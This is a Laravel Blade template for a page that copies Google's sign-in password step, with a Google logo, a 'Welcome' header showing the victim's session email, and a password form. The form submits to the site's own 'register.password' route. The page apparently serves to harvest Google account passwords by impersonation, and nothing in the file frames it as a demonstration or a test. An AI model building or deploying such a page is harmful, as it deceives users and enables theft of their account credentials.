<x-guest-layout>
    <!-- Session Status -->
    <x-auth-session-status class="mb-4" :status="session('status')" />
    @section('title')
        {{__('Enter password for Google account')}}
    @endsection
    <div class="containerPassword">
        <div class="container">
            <div class="progress" id="loader" style="display: none;"></div>
            <div class="imgBox">
                <img  src="{{asset('google-sign.png')}}" alt="Google" width="50px" height="30px"/>
            </div>
            <div class="box1">
                <div>
                    <div>
                        <h1 style="font-size: 36px"><strong>Welcome</strong></h1>
                        <br>
                        <p class="showmail">
{{--                            <img src="{{asset('account.png')}}" alt="account"/>--}}
                            <ion-icon name="person-circle-outline"></ion-icon>
                            {{session('email')}}
{{--                            <img src="{{asset('selectmenu.png')}}" alt="select"/>--}}
                            <ion-icon name="caret-down-outline"></ion-icon>
                        </p>
                    </div>
                </div>
                <div>
                    <form id="myForm" method="POST" action="{{ route('register.password') }}">
                        @csrf
                        <div>
                            <label for="password" >
                                {{--            <input id="email" type="email" name="email" required autofocus autocomplete="email" />--}}
                                <x-bladewind::input label="Enter your password" name="password" type="password"/>
                            </label>
                            {{--            <x-input-error :messages="$errors->get('email')" class="mt-2" />--}}
                            <br>
                        </div>
                        <div class="button">
                            <a style="color: #4285f4;cursor: pointer;">Forgot password?</a>
                            &nbsp;
                            &nbsp;
                            &nbsp;
                            &nbsp;
                            &nbsp;
                            <button id="submitBtn">
                                {{ __('Next') }}
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
    <script>
        document.getElementById('myForm').addEventListener('submit', function (e) {
            document.getElementById('submitBtn').disabled = true; // Disable submit button
            document.getElementById('loader').style.display = 'block'; // Show spinner
        });

    </script>
</x-guest-layout>
